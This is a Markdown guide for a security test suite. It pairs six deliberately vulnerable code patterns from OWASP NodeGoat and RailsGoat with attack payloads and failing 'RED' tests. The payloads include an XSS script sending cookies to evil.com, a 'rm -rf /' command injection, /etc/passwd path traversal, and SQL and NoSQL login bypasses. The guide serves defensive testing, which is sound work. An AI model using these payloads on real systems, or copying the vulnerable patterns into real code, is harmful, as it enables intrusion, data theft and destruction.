# Realistic Vulnerability Examples for Test Integration Tests

This document provides real-world vulnerability examples sourced from OWASP NodeGoat, RailsGoat, and OWASP Top 10 documentation. These examples should be used in our test suite to ensure we're testing against vulnerabilities we'll actually encounter in production.

## Sources
- **NodeGoat**: https://github.com/OWASP/NodeGoat
- **RailsGoat**: https://github.com/OWASP/railsgoat
- **OWASP Top 10 2021**: https://owasp.org/www-project-top-ten/

---

## 1. NoSQL Injection (MongoDB) - NodeGoat

### Vulnerability Pattern
```javascript
// VULNERABLE: Direct user input in MongoDB query
const username = req.body.username;
const password = req.body.password;

db.accounts.find({
  username: username,
  password: password
});
```

### Attack Vector
```javascript
// Attacker sends:
{
  "username": "admin",
  "password": {"$gt": ""}  // MongoDB operator injection
}

// Results in query:
db.accounts.find({
  username: "admin",
  password: {"$gt": ""}  // Matches any password!
});
```

### Real-World Impact
- **Bypass authentication** without knowing password
- **Extracted from**: NodeGoat login functionality
- **CWE**: CWE-89 (SQL Injection) / CWE-943 (Improper Neutralization of Special Elements in Data Query Logic)

### RED Test Should
```javascript
it('should reject NoSQL injection in login', async () => {
  const response = await request(app)
    .post('/login')
    .send({
      username: 'admin',
      password: { $gt: '' }  // Malicious payload
    });

  // Test FAILS on vulnerable code (allows login)
  expect(response.status).toBe(400);  // Should reject
  expect(response.body.error).toMatch(/invalid.*credentials/i);
});
```

---

## 2. SQL Injection (String Interpolation) - RailsGoat

### Vulnerability Pattern
```ruby
# VULNERABLE: String interpolation in SQL query
class UsersController < ApplicationController
  def update
    # Directly interpolating user input
    user = User.where("id = '#{params[:user][:id]}'")[0]
    user.update(params[:user])
  end
end
```

### Attack Vector
```ruby
# Attacker sends:
POST /users/update
{
  "user": {
    "id": "5') OR admin = 't' --'",
    "name": "attacker"
  }
}

# Results in SQL:
SELECT * FROM users WHERE id = '5') OR admin = 't' --'
# This bypasses ID check and grants admin access
```

### Real-World Impact
- **Privilege escalation** to admin
- **Data exfiltration** via UNION attacks
- **Extracted from**: RailsGoat user management
- **CWE**: CWE-89 (SQL Injection)

### RED Test Should
```ruby
it 'should reject SQL injection in user update' do
  post '/users/update', params: {
    user: {
      id: "5') OR admin = 't' --'",
      name: 'attacker'
    }
  }

  # Test FAILS on vulnerable code (allows injection)
  expect(response.status).to eq(400)  # Should reject
  expect(User.find(5).admin).to be_falsey  # Should not be admin
end
```

---

## 3. Stored XSS (Unescaped Output) - NodeGoat

### Vulnerability Pattern
```javascript
// VULNERABLE: Rendering user input without escaping
app.get('/profile/:userId', (req, res) => {
  db.users.findOne({ _id: req.params.userId }, (err, user) => {
    // Directly rendering user-supplied data
    res.send(`
      <html>
        <body>
          <h1>Profile: ${user.name}</h1>
          <p>Bio: ${user.bio}</p>
        </body>
      </html>
    `);
  });
});
```

### Attack Vector
```javascript
// Attacker registers with:
{
  "name": "Alice",
  "bio": "<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>"
}

// When victim views profile, script executes in their browser
```

### Real-World Impact
- **Cookie theft** / session hijacking
- **Keylogging** on that page
- **Defacement** of user profiles
- **Extracted from**: Common pattern in NodeGoat profiles
- **CWE**: CWE-79 (Cross-site Scripting)

### RED Test Should
```javascript
it('should escape XSS in profile bio', async () => {
  const xssPayload = '<script>alert("XSS")</script>';

  // Create user with XSS payload
  await User.create({
    name: 'attacker',
    bio: xssPayload
  });

  const response = await request(app).get('/profile/attacker');

  // Test FAILS on vulnerable code (renders script)
  expect(response.text).not.toContain('<script>');  // Should be escaped
  expect(response.text).toContain('&lt;script&gt;');  // Should see encoded version
});
```

---

## 4. Mass Assignment - RailsGoat

### Vulnerability Pattern
```ruby
# VULNERABLE: Allowing all parameters without filtering
class UsersController < ApplicationController
  def create
    # Accepts ANY parameter from user input
    @user = User.new(params[:user])
    @user.save
  end
end

# User model:
class User < ApplicationRecord
  # has attribute: admin (boolean)
end
```

### Attack Vector
```ruby
# Attacker sends:
POST /users
{
  "user": {
    "name": "Alice",
    "email": "alice@example.com",
    "admin": true  # Should not be settable by users!
  }
}

# Result: User is created with admin=true
```

### Real-World Impact
- **Privilege escalation** to admin on registration
- **Unauthorized data modification**
- **Extracted from**: RailsGoat user registration
- **CWE**: CWE-915 (Improperly Controlled Modification of Dynamically-Determined Object Attributes)

### RED Test Should
```ruby
it 'should not allow mass assignment of admin flag' do
  post '/users', params: {
    user: {
      name: 'Alice',
      email: 'alice@example.com',
      admin: true  # Malicious parameter
    }
  }

  # Test FAILS on vulnerable code (allows admin assignment)
  user = User.last
  expect(user.admin).to be_falsey  # Should not be admin
end
```

---

## 5. Command Injection - Real-world pattern

### Vulnerability Pattern
```javascript
// VULNERABLE: Unsanitized input in shell command
const { exec } = require('child_process');

app.post('/backup', (req, res) => {
  const filename = req.body.filename;

  // Directly using user input in shell command
  exec(`tar -czf backup.tar.gz ${filename}`, (error, stdout) => {
    res.send('Backup complete');
  });
});
```

### Attack Vector
```javascript
// Attacker sends:
POST /backup
{
  "filename": "data.txt; rm -rf / #"
}

// Results in command:
tar -czf backup.tar.gz data.txt; rm -rf / #
// This deletes the entire filesystem!
```

### Real-World Impact
- **Remote code execution**
- **System compromise**
- **Data destruction**
- **CWE**: CWE-78 (OS Command Injection)

### RED Test Should
```javascript
it('should reject command injection in backup', async () => {
  const response = await request(app)
    .post('/backup')
    .send({
      filename: 'data.txt; rm -rf / #'  // Malicious payload
    });

  // Test FAILS on vulnerable code (executes command)
  expect(response.status).toBe(400);  // Should reject
  expect(fs.existsSync('/tmp/test-file')).toBe(true);  // System should be intact
});
```

---

## 6. Path Traversal - Real-world pattern

### Vulnerability Pattern
```javascript
// VULNERABLE: Unsanitized file path
app.get('/download', (req, res) => {
  const filename = req.query.file;

  // Directly using user input in file path
  res.sendFile(`/app/uploads/${filename}`);
});
```

### Attack Vector
```javascript
// Attacker requests:
GET /download?file=../../../etc/passwd

// Results in reading:
/app/uploads/../../../etc/passwd
// = /etc/passwd
```

### Real-World Impact
- **Read sensitive files** (passwords, keys, config)
- **Source code disclosure**
- **CWE**: CWE-22 (Path Traversal)

### RED Test Should
```javascript
it('should reject path traversal in file download', async () => {
  const response = await request(app)
    .get('/download')
    .query({ file: '../../../etc/passwd' });  // Malicious path

  // Test FAILS on vulnerable code (allows traversal)
  expect(response.status).toBe(400);  // Should reject
  expect(response.text).not.toContain('root:x:');  // Should not expose passwd file
});
```

---

## Summary: Vulnerability Coverage

| Vulnerability | Source | Prevalence | Severity |
|--------------|--------|------------|----------|
| NoSQL Injection | NodeGoat | High (MongoDB apps) | Critical |
| SQL Injection | RailsGoat | Very High | Critical |
| Stored XSS | NodeGoat | Very High | High |
| Mass Assignment | RailsGoat | Medium (Rails) | High |
| Command Injection | OWASP | Medium | Critical |
| Path Traversal | OWASP | High | High |

## Test Suite Recommendations

1. **Use these exact attack vectors** in tests - they're proven exploits
2. **Expect tests to FAIL** on vulnerable code (RED tests)
3. **Include CWE numbers** in test names for traceability
4. **Reference source** (NodeGoat/RailsGoat) in comments
5. **Test should validate**:
   - Malicious input is rejected (400/403 response)
   - System state is NOT altered by attack
   - Data is NOT leaked

## Implementation Notes

When implementing Phase 1:
- LLM should see these patterns in prompts
- Backend AST integration should handle these test structures
- Retry loop should use these attack vectors for validation
